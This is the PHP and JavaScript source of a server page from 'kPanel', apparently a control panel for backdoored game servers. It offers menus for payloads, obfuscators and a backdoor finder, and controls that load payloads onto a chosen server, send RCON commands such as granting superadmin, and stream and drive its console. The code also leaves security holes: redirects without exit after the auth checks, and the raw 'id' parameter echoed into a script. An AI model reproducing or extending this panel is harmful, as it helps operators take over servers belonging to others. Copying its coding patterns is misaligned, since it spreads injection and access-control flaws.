<?php

include 'core/class/include.php';

// Redirige l'utilisateur si il n'est pas authentifier
if (!Account::isAuthentified())
{
    header('Location: ./login');
}

if (empty($_GET['id'])) {
  header('Location: ./servers');
}

$id = $_GET['id'];

if (!Server::DoExist($id)) {
  header('Location: ./servers');
}

if (!Server::IsOwner(null, $id)) {
  header('Location: ./servers');
}

if(Server::GetServerInfos($id)['last_update'] + 60 < time()) {
  $dotcolor = "red";
  $disabled = true;
} else {
  $dotcolor = "green";
  $disabled = false;
}


?>

<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>kPanel | Dashboard</title>
    <!-- plugins:css -->
    <link rel="stylesheet" href="assets/vendors/mdi/css/materialdesignicons.min.css">
    <link rel="stylesheet" href="assets/vendors/css/vendor.bundle.base.css">
    <!-- endinject -->
    <!-- Plugin css for this page -->
    <link rel="stylesheet" href="assets/vendors/jvectormap/jquery-jvectormap.css">
    <link rel="stylesheet" href="assets/vendors/flag-icon-css/css/flag-icon.min.css">
    <link rel="stylesheet" href="assets/vendors/owl-carousel-2/owl.carousel.min.css">
    <link rel="stylesheet" href="assets/vendors/owl-carousel-2/owl.theme.default.min.css">
    <!-- End plugin css for this page -->
    <!-- inject:css -->
    <link rel="stylesheet" href="/datajs/notifications.css">
    <script src="/datajs/notifications.js"></script>
    <!-- endinject -->
    <!-- Layout styles -->
    <link rel="stylesheet" href="assets/css/style.css">
    <!-- End layout styles -->
    <link rel="shortcut icon" href="https://kpanel.cz/home/assets/img/logo/kpanel.png" />
  </head>
  <body>
    <div class="container-scroller">
      <!-- partial:partials/_sidebar.html -->
      <nav class="sidebar sidebar-offcanvas" id="sidebar">
        <ul class="nav">
          <li class="nav-item profile">
            <div class="profile-desc">
              <div class="profile-pic">
                <div class="count-indicator">
                  <img class="img-xs rounded-circle " src="<?php echo Account::GetPP(); ?>" alt="">
                  <span class="count bg-success"></span>
                </div>
                <div class="profile-name">
                  <h5 class="mb-0 font-weight-normal"><?php echo Account::GetUsername(); ?></h5>
                  <?php
                  $hisrole = Account::GetRole();
                  $rolecolor = Account::GetRoleColor();
                  $rolecolorlink = Account::GetRoleColorFire();
                  if ($hisrole == "Administrateur") {
                    $role = "<span style='color: #000000; font-weight: bold; text-shadow: 0 0 5px ".$rolecolor.", 0 0 5px ".$rolecolor."; background: url(".$rolecolorlink.") repeat scroll 0% 0% transparent;}'>Administrateur</span>";
                  }
                  else {
                    $role = "<span>Utilisateur</span>";
                  }
                  ?>
                  <?php echo $role; ?>
                </div>
              </div>
              <a href="#" id="profile-dropdown" data-toggle="dropdown"><i class="mdi mdi-dots-vertical"></i></a>
              <div class="dropdown-menu dropdown-menu-right sidebar-dropdown preview-list" aria-labelledby="profile-dropdown">
                <a href="./profile" class="dropdown-item preview-item">
                  <div class="preview-thumbnail">
                    <div class="preview-icon bg-dark rounded-circle">
                      <i class="mdi mdi-settings text-primary"></i>
                    </div>
                  </div>
                  <div class="preview-item-content">
                    <p class="preview-subject ellipsis mb-1 text-small">Profil</p>
                  </div>
                </a>
              </div>
            </div>
          </li>
          <li class="nav-item nav-category">
            <span class="nav-link">Gestion</span>
          </li>
          <li class="nav-item menu-items">
            <a class="nav-link" href="dashboard">
              <span class="menu-icon">
                <i class="mdi mdi-speedometer"></i>
              </span>
              <span class="menu-title">Dashboard</span>
            </a>
          </li>
          <li class="nav-item menu-items active">
            <a class="nav-link" href="servers">
              <span class="menu-icon">
                <i class="mdi mdi-server"></i>
              </span>
              <span class="menu-title">Serveurs</span>
            </a>
          </li>
          <li class="nav-item menu-items">
            <a class="nav-link" href="history">
              <span class="menu-icon">
                <i class="mdi mdi-wechat"></i>
              </span>
              <span class="menu-title">Historique</span>
            </a>
          </li>
          <li class="nav-item menu-items">
            <a class="nav-link" href="payloads">
              <span class="menu-icon">
                <i class="mdi mdi-code-tags"></i>
              </span>
              <span class="menu-title">Payloads</span>
            </a>
          </li>
          <li class="nav-item nav-category">
            <span class="nav-link">Outils</span>
          </li>
          <li class="nav-item menu-items">
            <a class="nav-link" href="chat">
              <span class="menu-icon">
                <i class="mdi mdi-wechat"></i>
              </span>
              <span class="menu-title">Chat</span>
            </a>
          </li>
          <li class="nav-item menu-items">
            <a class="nav-link" href="obfu">
              <span class="menu-icon">
                <i class="mdi mdi-barcode"></i>
              </span>
              <span class="menu-title">Obfuscateurs</span>
            </a>
          </li>
          <li class="nav-item menu-items">
            <a class="nav-link" href="bdfinder">
              <span class="menu-icon">
                <i class="mdi mdi-code-array"></i>
              </span>
              <span class="menu-title">Backdoor Finder</span>
            </a>
          </li>
          <li class="nav-item menu-items">
            <a class="nav-link" href="smartlua">
              <span class="menu-icon">
                <i class="mdi mdi-wheelchair-accessibility"></i>
              </span>
              <span class="menu-title">Smart lua<div class="badge badge-info badge-xs">Beta</div></span>
            </a>
          </li>
          <li class="nav-item nav-category">
            <span class="nav-link">Autres</span>
          </li>
          <li class="nav-item menu-items">
            <a class="nav-link" href="rules">
              <span class="menu-icon">
                <i class="mdi mdi-clipboard-text"></i>
              </span>
              <span class="menu-title">Règles</span>
            </a>
          </li>
          <li class="nav-item menu-items">
            <a class="nav-link" href="wallofshame">
              <span class="menu-icon">
                <i class="mdi mdi-gavel"></i>
              </span>
              <span class="menu-title" style="color: #000000; font-weight: bold; text-shadow: 0 0 5px #800080, 0 0 5px #800080; background: url(/imgs/fire_purple.gif) repeat scroll -5% 0% transparent;">Wall Of Shame</span>
            </a>
          </li>
          <?php if (Account::IsAdmin()) { ?>
            <li class="nav-item nav-category">
              <span class="nav-link">Administration</span>
            </li>
            <li class="nav-item menu-items">
              <a class="nav-link" href="users">
                <span class="menu-icon">
                  <i class="mdi mdi-account-circle"></i>
                </span>
                <span class="menu-title">Utilisateurs</span>
              </a>
            </li>
            <li class="nav-item menu-items">
              <a class="nav-link" href="allservers">
                <span class="menu-icon">
                  <i class="mdi mdi-server"></i>
                </span>
                <span class="menu-title">Tous les serveurs</span>
              </a>
            </li>
            <li class="nav-item menu-items">
              <a class="nav-link" href="logs">
                <span class="menu-icon">
                  <i class="mdi mdi-settings"></i>
                </span>
                <span class="menu-title">Logs</span>
              </a>
            </li>
          <?php } ?>
        </ul>
      </nav>
      <!-- partial -->
      <div class="container-fluid page-body-wrapper">
        <!-- partial:partials/_navbar.html -->
        <nav class="navbar p-0 fixed-top d-flex flex-row">
          <div class="navbar-brand-wrapper d-flex d-lg-none align-items-center justify-content-center">
            <a class="navbar-brand brand-logo-mini" href="index.html"><img src="assets/images/logo-mini.svg" alt="logo" /></a>
          </div>
          <div class="navbar-menu-wrapper flex-grow d-flex align-items-stretch">
            <button class="navbar-toggler navbar-toggler align-self-center" type="button" data-toggle="minimize">
              <span class="mdi mdi-menu"></span>
            </button>
            <ul class="navbar-nav navbar-nav-right">
              <li class="nav-item dropdown">
                <a class="nav-link" id="profileDropdown" href="#" data-toggle="dropdown">
                  <div class="navbar-profile">
                    <img class="img-xs rounded-circle" src="<?php echo Account::GetPP();?>" alt="">
                    <p class="mb-0 d-none d-sm-block navbar-profile-name"><?php echo Account::GetUsername();?></p>
                    <i class="mdi mdi-menu-down d-none d-sm-block"></i>
                  </div>
                </a>
                <div class="dropdown-menu dropdown-menu-right navbar-dropdown preview-list" aria-labelledby="profileDropdown">
                  <h6 class="p-3 mb-0">Profil</h6>
                  <div class="dropdown-divider"></div>
                  <a class="dropdown-item preview-item" href="./profile">
                    <div class="preview-thumbnail">
                      <div class="preview-icon bg-dark rounded-circle">
                        <i class="mdi mdi-settings text-success"></i>
                      </div>
                    </div>
                    <div class="preview-item-content">
                      <p class="preview-subject mb-1">Profil</p>
                    </div>
                  </a>
                  <div class="dropdown-divider"></div>
                  <a class="dropdown-item preview-item" href="./logout">
                    <div class="preview-thumbnail">
                      <div class="preview-icon bg-dark rounded-circle">
                        <i class="mdi mdi-logout text-danger"></i>
                      </div>
                    </div>
                    <div class="preview-item-content">
                      <p class="preview-subject mb-1">Déconnection</p>
                    </div>
                  </a>
                </div>
              </li>
            </ul>
            <button class="navbar-toggler navbar-toggler-right d-lg-none align-self-center" type="button" data-toggle="offcanvas">
              <span class="mdi mdi-format-line-spacing"></span>
            </button>
          </div>
        </nav>
        <?php if (Server::GetServerInfos($id)['server_rcon'] == "Pas de RCON") {
          $margin = "col-12";
        } else {
          $margin = "col-lg-6";
        } ?>
        <!-- partial -->
        <div class="main-panel">
          <div class="content-wrapper">
            <div class="row">
              <div class="<?php echo $margin; ?> grid-margin">
                <div class="card">
                  <div class="card-body">
                    <h4 class="card-title">Payload</h4>
                    <div class="table-responsive">
                      <div class="form-group">
                        <label>Payload</label>
                        <select class="form-control" id="server-payload">
                        </select>
                      </div>
                      <br>
                      <div class="form-group" id="thearg" style="display: none;">
                        <label>Argument</label>
                        <input class="form-control" id="payload-arg" placeholder="Argument">
                      </div>
                      <button type="button" <?php if($disabled == false) { ?> onclick="callPayload()"<?php } else {?> disabled <?php }?> class="btn btn-info float-right">Charger le Payload</button>
                    </div>
                  </div>
                </div>
              </div>
              <?php if (Server::GetServerInfos($id)['server_rcon'] != "Pas de RCON") { ?>
              <div class="col-lg-6 grid-margin">
                <div class="card">
                  <div class="card-body">
                    <h4 class="card-title">RCON</h4>
                    <div class="table-responsive">
                      <div class="form-group">
                        <label>Commande</label>
                        <input type="text" name="rcon-text" id="rcon-text" placeholder="ulx adduser ---- superadmin" class="form-control" />
                      </div>
                      <br>
                      <button type="button" <?php if($disabled == false) { ?> onclick="rcon()"<?php } else {?> disabled <?php }?> class="btn btn-info float-right">Executer la commande</button>
                    </div>
                  </div>
                </div>
              </div>
              <?php } ?>
            </div>
            <div class ="row">
              <div class="col-12 grid-margin">
                <div class="card">
                  <div class="card-body">
                    <h4 class="card-title">Informations</h4>
                    <div class="table-responsive">
                      <center>
                        <style>
.dot {
  height: 10px;
  width: 10px;
  border-radius: 50%;
  display: inline-block;
}
</style>
                        <h4><span class="dot" style="background-color: <?php echo $dotcolor; ?> ;"></span>&nbsp;<?php echo Server::GetServerInfos($id)['server_name']; ?></h4></center>
                        <table class="table">
                          <?php $ip_data = explode(':', Server::GetServerInfos($id)['server_ip']); ?>
                          <tbody>
                            <tr>
                              <td>IPv4</td>
                              <td><?php echo $ip_data[0]; ?></td>
                            </tr>
                            <tr>
                              <td>Port</td>
                              <td><?php echo $ip_data[1] ;?></td>
                            </tr>
                            <tr>
                              <td>Utilisateur</td>
                              <td><?php echo Server::GetServerInfos($id)['server_users']; ?></td>
                            </tr>
                            <tr>
                              <td>RCON</td>
                              <td><?php echo Server::GetServerInfos($id)['server_rcon']; ?></td>
                            </tr>
                            <tr>
                              <td>Actions</td>
                              <td><?php echo '<a class="btn btn-info" href="steam://connect/'.Server::GetServerInfos($id)['server_ip'].'" target="_blank">Connexion</a>' ?></td>
                            </tr>
                          </tbody>
                        </table>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div class ="row">
              <div class="col-12 grid-margin">
                <div class="card">
                  <div class="card-body">
                    <h4 class="card-title">Console</h4>
                    <div class="table-responsive">
                      <textarea id="console" class="form-control text-info" rows=35 readonly style="background-color: #2A3038"></textarea>
                      <div class="input-group">
                      <input id="console_snd" class="form-control" style="background-color: #152036; color: white; border-color: #2c3851;" placeholder="Commande a envoyer"></input>
                      <div class="input-group-append">
                        <button class="btn btn-info" type="button" <?php if($disabled == false) { ?> onclick="SendToServer()" <?php } else {?> disabled <?php }?>>Envoyer</button>
                      </div>
                    </div>
                    </div>
                  </div>
                </div>
              </div>
          </div>
          <!-- content-wrapper ends -->
          <!-- partial:partials/_footer.html -->
          <footer class="footer">
            <div class="d-sm-flex justify-content-center justify-content-sm-between">
              <span class="text-muted text-center text-sm-left d-block d-sm-inline-block">Copyright © 2020 <a href="#" target="_blank">kPanel</a>. All rights reserved.</span>
            </div>
          </footer>
          <!-- partial -->
        </div>
        <!-- main-panel ends -->
      </div>
      <!-- page-body-wrapper ends -->
    </div>
    <!-- container-scroller -->
    <!-- plugins:js -->
    <script src="assets/vendors/js/vendor.bundle.base.js"></script>
    <!-- endinject -->
    <!-- Plugin js for this page -->
    <script src="assets/vendors/chart.js/Chart.min.js"></script>
    <script src="assets/vendors/progressbar.js/progressbar.min.js"></script>
    <script src="assets/vendors/jvectormap/jquery-jvectormap.min.js"></script>
    <script src="assets/vendors/jvectormap/jquery-jvectormap-world-mill-en.js"></script>
    <script src="assets/vendors/owl-carousel-2/owl.carousel.min.js"></script>
    <!-- End plugin js for this page -->
    <!-- inject:js -->
    <script src="assets/js/off-canvas.js"></script>
    <script src="assets/js/hoverable-collapse.js"></script>
    <script src="assets/js/misc.js"></script>
    <script src="assets/js/settings.js"></script>
    <script src="assets/js/todolist.js"></script>
    <!-- endinject -->
    <!-- Custom js for this page -->
    <script src="assets/js/dashboard.js"></script>
    <script>
    var action_server_id = <?php echo $_GET['id']; ?>;

    $.ajax({
      url: "core/ajax/get-payload-name.php"
    }).done(function(data){
        $("#server-payload").html("");
        $.each(data, function(i, item) {
            $("#server-payload").append("<option value=\"" + item.id + "\">" + item.payload_name + "</option>");
        });
    });

    $('#server-payload').on('change', function () {
         var selectVal = $("#server-payload option:selected").val();
         console.log(selectVal);
         $.ajax({
           url: "core/ajax/is-arged.php?id=" + selectVal
         }).done(function(data){
             console.log(data);
             if(data == "true") {
               $("#thearg").css("display", "block");
             } else {
               $("#thearg").css("display", "none");
             }
         });
    });

    var loaded = 0;

    function callPayload()
    {
        var payload_id = $("#server-payload").val();
        var arg = $("#payload-arg").val();
        $.ajax({
          url: "core/ajax/call-payload.php?server=" + action_server_id + "&payload=" + payload_id + "&arg=" + arg
        });

        var loaded = 0;

        console.log("loading");

        const loadingNot = window.createNotification({
            theme: 'info',
        });

        loadingNot({
          title: 'Chargement...',
          message: 'Chargement du payload...'
        });

        checkCallStatut();
    }

    function SendToServer() {
      var arg = $("#console_snd").val();
      $.ajax({
        url: "core/ajax/call-cmd.php?server=" + action_server_id + "&arg=" + arg
      });
    }

    function checkCallStatut()
    {
        call_check_timer = setInterval(function(){
            $.ajax({
                url: "core/ajax/call-statut.php?server=" + action_server_id
            }).done(function(data){
                if (data == 'success')
                {
                    clearInterval(call_check_timer);

                    console.log("loaded");
                    console.log(loaded);

                    const loadedNot = window.createNotification({
                        theme: 'success',
                    });

                    loadedNot({
                      title: 'Payload chargé',
                      message: 'Payload chargé avec succès !'
                    });

                    var loaded = 1;


                }
            });
        }, 0.5 * 1000);
    }

    setInterval(function(){
      $.ajax({
        url: "core/ajax/get-server-console.php?id=" + action_server_id
      }).done(function(data){
        $("#console").html(data);
      });
    }, 0.5 * 1000);

    </script>
    <!-- End custom js for this page -->
  </body>
</html>
